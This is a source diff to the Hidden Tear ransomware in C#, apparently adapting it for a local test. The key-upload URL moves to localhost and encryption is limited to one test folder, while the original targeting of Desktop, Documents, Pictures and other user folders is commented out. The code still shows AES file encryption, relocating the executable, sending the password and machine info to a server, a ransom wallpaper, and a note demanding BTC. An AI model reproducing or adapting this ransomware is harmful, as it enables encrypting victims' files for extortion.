@@ -50,10 +50,12 @@ namespace hidden_tear
         [DllImport("user32.dll", CharSet = CharSet.Auto)]
         private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
         //Url to send encryption password and computer info
-        string targetURL = "http://www.example.com/Server/write.php";
-        string userName = Environment.UserName;
+        //string targetURL = "http://www.example.com/Server/write.php";
+        string targetURL = "http://localhost/hidden-tear/write.php";
+        //string userName = Environment.UserName;
+        string userName = "fintech";
         string computerName = System.Environment.MachineName.ToString();
-        string userDir = "C:\\";
+        string userDir = "C:\\Users\\최고의 지식근로자\\Desktop\\";
         string backgroundImageUrl = "http://i.imgur.com/xZuLWTN.jpg"; //desktop background picture
 
 
@@ -158,8 +160,8 @@ namespace hidden_tear
 
             byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);
 
-            string users = "Users\\";
-            string path_inf = users + userName + "\\Desktop\\READ_IT.txt.locked";       //path of the info file
+            //string users = "Users\\";
+            string path_inf = userDir + "\\test\\READ_IT.txt.locked";       //path of the info file
             string fullpath_inf = userDir + path_inf;
             if (File.Exists(fullpath_inf))
             {
@@ -204,8 +206,8 @@ namespace hidden_tear
         //create a random dir and move virus on it to avoid conflicts with encryption itself
         public void MoveVirus()
         {
-            string destFileName = userDir + userName + "\\Rand123";
-            string destFileName_2 = userDir + userName + "\\Rand123\\local.exe";
+            string destFileName = userDir + "\\test\\Rand123";
+            string destFileName_2 = userDir  + "\\test\\Rand123\\local.exe";
             if (!Directory.Exists(destFileName))
             {
                 Directory.CreateDirectory(destFileName);
@@ -250,7 +252,7 @@ namespace hidden_tear
             Directory_Settings_Sending(password);
             messageCreator();
             bool Internet;
-            string backgroundImageName = userDir + userName + "\\ransom.jpg";
+            string backgroundImageName = userDir + "\\test\\ransom.jpg";
             // creating a loop if connection doesn't exist while it is available again to send password and change background desktop
             do
             {
@@ -267,40 +269,43 @@ namespace hidden_tear
 
         public void Directory_Settings_Sending(string password){
             //path to ecnrypt (child drectories already included)
-            string path_1 = "Users\\";
-            string startPath_1 = userDir + path_1 + userName + "\\Desktop";
-            string startPath_2 = userDir + path_1 + userName + "\\Links";
-            string startPath_3 = userDir + path_1 + userName + "\\Contacts";
-            string startPath_4 = userDir + path_1 + userName + "\\Desktop";
-            string startPath_5 = userDir + path_1 + userName + "\\Documents";
-            string startPath_6 = userDir + path_1 + userName + "\\Downloads";
-            string startPath_7 = userDir + path_1 + userName + "\\Pictures";
-            string startPath_8 = userDir + path_1 + userName + "\\Music";
-            string startPath_9 = userDir + path_1 + userName + "\\OneDrive";
-            string startPath_10 = userDir + path_1 + userName + "\\Saved Games";
-            string startPath_11 = userDir + path_1 + userName + "\\Favorites";
-            string startPath_12 = userDir + path_1 + userName + "\\Searches";
-            string startPath_13 = userDir + path_1 + userName + "\\Videos";
-            encryptDirectory(startPath_1, password);
-            encryptDirectory(startPath_2, password);
-            encryptDirectory(startPath_3, password);
-            encryptDirectory(startPath_4, password);
-            encryptDirectory(startPath_5, password);
-            encryptDirectory(startPath_6, password);
-            encryptDirectory(startPath_7, password);
-            encryptDirectory(startPath_8, password);
-            encryptDirectory(startPath_9, password);
-            encryptDirectory(startPath_10, password);
-            encryptDirectory(startPath_11, password);
-            encryptDirectory(startPath_12, password);
-            encryptDirectory(startPath_13, password);
+            //string path_1 = "Users\\test\\";
+            string startPath_0 = userDir + "\\test\\randsome";
+            //string startPath_1 = userDir + "\\test\\Desktop";
+            //string startPath_2 = userDir + "\\test\\Links";
+            //string startPath_3 = userDir + "\\test\\Contacts";
+            //string startPath_4 = userDir + "\\test\\Desktop";
+            //string startPath_5 = userDir + "\\test\\Documents";
+            //string startPath_6 = userDir + "\\test\\Downloads";
+            //string startPath_7 = userDir + "\\test\\Pictures";
+            //string startPath_8 = userDir + "\\test\\Music";
+            //string startPath_9 = userDir + "\\test\\OneDrive";
+            //string startPath_10 = userDir + "\\test\\Saved Games";
+            //string startPath_11 = userDir + "\\test\\Favorites";
+            //string startPath_12 = userDir + "\\test\\Searches";
+            //string startPath_13 = userDir + "\\test\\Videos";
+            encryptDirectory(startPath_0, password);
+            //encryptDirectory(startPath_1, password);
+            //encryptDirectory(startPath_2, password);
+            //encryptDirectory(startPath_3, password);
+            //encryptDirectory(startPath_4, password);
+            //encryptDirectory(startPath_5, password);
+            //encryptDirectory(startPath_6, password);
+            //encryptDirectory(startPath_7, password);
+            //encryptDirectory(startPath_8, password);
+            //encryptDirectory(startPath_9, password);
+            //encryptDirectory(startPath_10, password);
+            //encryptDirectory(startPath_11, password);
+            //encryptDirectory(startPath_12, password);
+            //encryptDirectory(startPath_13, password);
         }
 
         public void messageCreator()
         {
-            string path = "\\Desktop\\READ_IT.txt";
-            string fullpath = userDir + "Users\\" + userName + path;
-            string infos = computerName + "-" + userName;
+            //string path = "\\Desktop\\READ_IT.txt";
+            //string fullpath = userDir + "Users\\" + userName + path;
+            string fullpath = "C:\\Users\\최고의 지식근로자\\Desktop\\test\\READ_IT.txt";
+            //string infos = computerName + "-" + userName;
             string[] lines = { "This computer has been hacked","Your personal files have been ecrypted. Send me BTC or food to get decryption passcode.", "After that, you'll be able to see your beloved files again.","With love... Hidden Tear Project :')"};
             System.IO.File.WriteAllLines(fullpath, lines);
         }
